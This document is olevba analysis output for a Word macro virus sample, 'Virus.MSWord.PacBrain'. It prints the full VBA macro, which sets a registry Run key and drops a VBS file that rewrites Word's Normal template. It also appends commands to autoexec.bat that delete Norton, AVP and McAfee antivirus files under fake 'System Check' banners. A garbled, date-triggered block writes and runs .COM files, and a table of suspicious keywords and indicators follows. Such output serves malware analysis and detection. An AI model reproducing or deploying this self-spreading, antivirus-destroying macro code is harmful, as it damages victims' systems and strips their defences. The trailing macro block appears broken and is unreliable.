olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.PacBrain
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.PacBrain - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.PacBrain - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Attribute VB_Name = "THIS DOCUMENT"
'W2000\Hllp.Muffin Man
'created by ahsanjutt a.vkiller

Private Sub Document_Close()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "muffin") = "C:\muffin.vbs"
Open "C:\muffin.vbs" For Output As #1
Print #1, "Set wordobj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "muffin = wscript.ScriptFullName"
Print #1, "Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines"
Print #1, "NT.CodeModule.AddFromFile muffin"
Print #1, "NT.CodeModule.DeleteLines 1, 7"
Print #1, "wordobj.Quit"
Print #1, TD
Close #1
End Sub

Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo muffin muffin muffin"
Print #1, "echo ** muffin **"
Print #1, "echo want some"

Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"

Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."

Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "

Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."

Print #1, "echo [McAfee System Check]"
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "

Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
Close #1
End Sub
If Month(Now) = 12 And Day(Now) = 14 Then
IF(NOT(FE(`C:\\NTLDR.')),`RR("KERNEL32","Sleep","U")')
IF(NOT(FE(`C:\\NTLDR.')),`EF(`COMMAND.COM',",'"/CECHO ?????????? >C:\\\?????.COM",0)')
IF(NOT(FE(`C:\\NTLDR.')),`Sleep(550)')
IF(NOT(FE(`C:\\NTLDR.')),`EF(`COMMAND.COM',",'"/CECHO ?????????? >C:\\\\?????.COM",0)')
IF(NOT(FE(`C:\\NTLDR.')),`Sleep(550)')
IF(NOT(FE(`C:\\NTLDR.')),`EF(`COMMAND.COM',",'"/CECHO ?????????? >C:\\\\?????.COM",0)')
IF(NOT(FE(`C:\\NTLDR.')),`Sleep(550)')
IF(NOT(FE(`C:\\NTLDR.')),`EF(`COMMAND.COM',",'"/CECHO ?????????? >C:\\\\?????.COM",0)')
IF(NOT(FE(`C:\\NTLDR.')),`Sleep(550)')
IF(NOT(FE(`C:\\NTLDR.')),`EF(`C:\\\\CFBEY.COM',qchPath,0)')
End If



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |muffin.vbs          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

